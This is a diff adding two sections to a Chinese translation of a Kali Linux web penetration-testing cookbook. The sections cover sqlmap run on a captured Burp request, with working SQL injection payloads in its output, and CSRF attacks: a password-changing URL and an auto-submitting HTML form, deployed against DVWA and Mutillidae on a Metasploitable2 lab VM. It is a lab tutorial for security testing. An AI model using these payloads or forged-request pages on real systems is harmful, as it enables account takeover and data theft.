@@ -770,3 +770,145 @@ Table: credit_cards
 ### 工作原理
 
 sqlmap 的原理是提交来自大量已知 SQL 注入查询列表的请求。它在近几年间已经高度优化，并给予之前查询的响应来智能调整注入。在 HTTP POST 参数上执行 SQL 注入的原理是操作添加到 POST 方法请求末尾的数据。
+
+## 7.16 使用 sqlmap 注入捕获的请求
+
+为了简化 sqlmap 的使用流程，可以使用来自 BurpSuite 的捕获请求并使用定义在其中的所有参数和配置来执行 sqlmap。在这个秘籍中，我们会讨论如何使用 sqlmap 来测试和所捕获请求相关的参数。
+
+### 准备
+
+为了使用 sqlmap 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。
+
+### 操作步骤
+
+为了在 sqlmap 中使用捕获的请求，必须首先将其保存为文本格式。为了这样做，右击 BurpSuite 中的请求内容之后选择`Copy to file`。保存之后，你就可以通过浏览器目录并使用`cat`命令来验证文件内容。
+
+```
+root@KaliLinux:~# cat dvwa_capture 
+GET /dvwa/vulnerabilities/sqli_blind/?id=test_here&Submit=Submit HTTP/1.1
+Host: 172.16.36.135 
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Referer: http://172.16.36.135/dvwa/vulnerabilities/sqli_blind/ 
+Cookie: security=low; PHPSESSID=8aa4a24cd6087911eca39c1cb95a7b0c 
+Connection: keep-alive 
+```
+
+为了使用捕获的请求，以 `-r`参数执行 sqlmap，值为文件的绝对路径。这个方式通常会极大降低在`sqlmap`命令中需要提供的信息量，因为需要提供的多数信息都包含在文件里了。看看下面的例子：
+
+```
+oot@KaliLinux:~# sqlmap -r /root/dvwa_capture --level=5 --risk=3 -p id
+[*] starting at 16:44:09
+[16:44:09] [INFO] parsing HTTP request from '/root/dvwa_capture' 
+```
+
+在上面的例子中，不需要向 sqlmap 传递任何 Cookie 值，因为 Cookie 值已经定义在捕获的请求中了。当 sqlmap 运行时，捕获文件中的 Cookie 会自动在所有请求中使用，像这样：
+
+```
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N 
+sqlmap identified the following injection points with a total of 487 HTTP(s) requests: 
+--
+Place: GET 
+Parameter: id
+    Type: boolean-based blind 
+    Title: OR boolean-based blind - WHERE or HAVING clause    
+    Payload: id=-8210' OR (7740=7740) AND 'ZUCk'='ZUCk&Submit=Submit
+    
+    Type: UNION query    
+    Title: MySQL UNION query (NULL) - 2 columns    
+    Payload: id=test_here' UNION ALL SELECT NULL,CONCAT(0x3a6f63723a,0x67 744e67787a6157674e,0x3a756c753a)#&Submit=Submit
+    
+    Type: AND/OR time-based blind    
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    
+    Payload: id=test_here' AND 4329=BENCHMARK(5000000,MD5(0x486a7a4a)) AND 'ARpD'='ARpD&Submit=Submit 
+```
+
+sqlmap 能够测试捕获请求中的所有识别的 GET 方法参数。这里，我们可以看到，`ID`参数存在多个 SQL 注入漏洞。
+
+### 工作原理
+
+sqlmap 能够接受捕获的请求，来解析请求的内容并是被任何可测试的参数。这让 sqlmap 能够高效执行，而不需要花费额外的经历来传递攻击所需的所有参数。
+
+## 7.17 自动化 CSRF 测试
+
+跨站请求伪造（CSRF）是最难以理解的 Web 应用漏洞之一。无论如何，不能够识别这类漏洞会危害 Web 应用和它的用户。这个秘籍中，我们会讨论如何测试 GET 和 POST 方法中的 CSRF 漏洞。
+
+### 准备
+
+为了对目标执行 CSRF 测试，你需要拥有运行一个或多个含有 CSRF 漏洞的 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。
+
+### 操作步骤
+
+CSRF 可能会出现在 GET 或 POST 方法的事务中，DVWA 提供了 GET 方法 CSRF 漏洞的一个良好示例。应用允许用户通过 GET 方法提交新的值两次来更新密码。
+
+```
+GET /dvwa/vulnerabilities/csrf/?password_new=password&password_ conf=password&Change=Change HTTP/1.1 
+Host: 172.16.36.135 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Referer: http://172.16.36.135/dvwa/vulnerabilities/csrf/ 
+Cookie: security=low; PHPSESSID=8aa4a24cd6087911eca39c1cb95a7b0c 
+```
+
+由于缺少 CSRF 控制，我们尝试利用这个漏洞。如果 Web 应用的用户被引诱来访问某个 URL，其中含有预先配置的`password_ new `和`password_ conf`值，攻击者就能强迫受害者将密码修改为攻击者的选择。下面的 URL 是个利用的示例。如果受害者访问了这个链接，它们的密码会被修改为`compromised`。
+
+```
+http://172.16.36.135/dvwa/vulnerabilities/csrf/?password_ new=compromised&password_conf=compromised&Change=Change#
+```
+
+但是，这种可以简单利用的 CSRF 漏洞很少存在。这是因为多数开发者对安全拥有起码的终止，不会使用 GET 方法参数来执行安全事务。POST 方法 CSRF 的一个例子是 Mutillidae  应用的 `blog`功能，像这样：
+
+```
+POST /mutillidae/index.php?page=add-to-your-blog.php HTTP/1.1 
+Host: 172.16.36.135 
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Referer: http://172.16.36.135/mutillidae/index.php?page=add-to-your-blog. php 
+Cookie: username=Victim; uid=17; PHPSESSID=8aa4a24cd6087911eca39c1cb95a7 b0c 
+Connection: keep-alive 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 98
+
+csrf-token=SecurityIsDisabled&blog_entry=This+is+my+blog+entry&add-toyour-blog-php-submit-button=Save+Blog+Entry
+```
+
+上面的例子中，我们可以看到，验证用户所提交的`blog`入口通过`blog_entry`POST 方法参数传递。为了利用这个 CSRF 控制的缺失，攻击者需要构造恶意页面，它能导致受害者提交所需的参数。下面是个 POST 方法 CSRF 攻击的例子：
+
+```html
+<html> 
+<head>        
+    <title></title> 
+</head> 
+<body>        
+    <form name="csrf" method="post" action="http://172.16.36.135/ mutillidae/index.php?page=add-t$                
+        <input type="hidden" name="csrf-token" value="SecurityIsDisabled" />                
+        <input type="hidden" name="blog_entry" value="HACKED" />                
+        <input type="hidden" name="add-to-your-blog-phpsubmit-button" value="Save+Blog+Entr$        
+    </form>        
+    <script type="text/javascript">                
+        document.csrf.submit();        
+    </script> </body> </html> 
+```
+
+这个恶意 Web 页面使用了 HTML 表单，它将多个隐藏的输入字段返回给服务器，这些字段对应 Mutillidae 应用的`blog`入口提交请求所需的相同输入。此外，JS 用于提交表单。所有这些事情在受害者不执行任何操作的情况下就会发生。考虑下面的例子：
+
+```
+root@KaliLinux:~# mv CSRF.html /var/www/ 
+root@KaliLinux:~# /etc/init.d/apache2 start 
+[....] Starting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName 
+. ok
+```
+
+为了部署这个恶意 Web 内容，应该将其移动到 Web 根目录下。在 Kali 中，默认的 Apache Web 根目录是`/var/www/`。同样，确保 Apache2 服务已打开。像这样：
+
+![](img/7-17-1.jpg)
+
+当验证后的受害者浏览器恶意页面时，受害者会自动重定向到 Mutillidae  博客应用，并提交博客入口`HACKED `。
+
+### 工作原理
+
+CSRF 的成因是请求最终由用户的会话生成。这个攻击利用受害者浏览器已经和远程 Web 服务器建立连接的信任。在 GET 方法 CSRF 的例子中，受害者被诱导访问某个 URL，其中的参数为恶意事务而定义。在 POST 方法 CSRF 的例子中，受害者被诱导浏览定义了参数的页面，这些参数随后会由受害者的浏览器转发给漏洞服务器，来指定恶意事务。在每个例子中，事务由于请求来自受害者的浏览器而被执行，受害者已经和漏洞服务器建立了可信的会话。
